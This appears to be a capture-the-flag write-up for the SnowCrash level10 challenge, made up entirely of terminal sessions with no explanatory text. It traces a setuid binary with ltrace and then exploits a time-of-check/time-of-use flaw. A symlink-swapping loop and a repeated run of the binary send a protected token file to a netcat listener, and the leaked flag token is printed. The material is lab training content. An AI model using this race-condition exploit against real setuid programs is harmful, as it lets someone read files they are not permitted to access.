
```
ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

```
level10@SnowCrash:~$ ls
level10  token
level10@SnowCrash:~$ echo "Bonjour" > /tmp/bonjour
level10@SnowCrash:~$ ltrace ./level10 /tmp/bonjour a
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/bonjour", 4)                        = 0
printf("Connecting to %s:6969 .. ", "a")         = 24
fflush(0xb7fd1a20Connecting to a:6969 .. )                               = 0
socket(2, 1, 0)                                  = 3
inet_addr("a")                                   = 0xffffffff
htons(6969, 1, 0, 0, 0)                          = 14619
connect(3, 0xbffff71c, 16, 0, 0)                 = -1
printf("Unable to connect to host %s\n", "a"Unable to connect to host a
)    = 28
exit(1 <unfinished ...>
+++ exited (status 1) +++
level10@SnowCrash:~$ 
```


```

level10@SnowCrash:~$ ltrace ./level10 /tmp/bonjour 0
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/bonjour", 4)                        = 0
printf("Connecting to %s:6969 .. ", "0")         = 24
fflush(0xb7fd1a20Connecting to 0:6969 .. )                               = 0
socket(2, 1, 0)                                  = 3
inet_addr("0")                                   = NULL
htons(6969, 1, 0, 0, 0)                          = 14619
connect(3, 0xbffff71c, 16, 0, 0)                 = 0
write(3, ".*( )*.\n", 8)                         = 8
printf("Connected!\nSending file .. "Connected!
)           = 27
fflush(0xb7fd1a20Sending file .. )                               = 0
open("/tmp/bonjour", 0, 010)                     = 4
read(4, "Bonjour\n", 4096)                       = 8
write(3, "Bonjour\n", 8)                         = 8
puts("wrote file!"wrote file!
)                              = 12
+++ exited (status 12) +++

```

```
level10@SnowCrash:~$ nc -lk 6969
.*( )*.
Bonjour

```



```

.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
```

```

touch /tmp/fakefile
while true; do
        ln -sf /tmp/fakefile /tmp/link
        ln -sf ~/token /tmp/link
done

```

```

while true; do
~/./level10 /tmp/link 0
done

```